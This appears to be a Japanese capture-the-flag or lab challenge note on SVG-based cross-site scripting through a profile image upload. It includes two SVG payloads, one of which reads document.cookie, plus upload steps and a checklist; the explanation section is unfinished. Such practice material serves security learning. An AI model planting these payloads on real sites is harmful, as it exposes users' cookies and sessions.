# Cross-Site Imaging ❌

**難易度:** ⭐⭐⭐⭐⭐
**カテゴリ:** SVG インジェクション
**目標:** SVG 画像を使って XSS を実行

## ヒント

- **機能:** プロフィール画像アップロード
- **技術:** SVG は XML ベースで JavaScript を含められる
- **ポイント:** Content-Type と CSP のバイパス

## 攻撃用 SVG

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <script type="text/javascript">
    alert('XSS via SVG');
  </script>
</svg>
```

## より高度なペイロード

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(document.cookie)</script>
    </body>
  </foreignObject>
</svg>
```

## 手順

1. 攻撃用 SVG ファイルを作成
2. プロフィール画像としてアップロード
3. 画像を直接開いて XSS 発動を確認

## 検証ポイント

- [ ] SVG アップロードが許可されているか
- [ ] 直接アクセス時に JavaScript が実行されるか
- [ ] CSP がバイパスされるか

## 解説

[未着手]
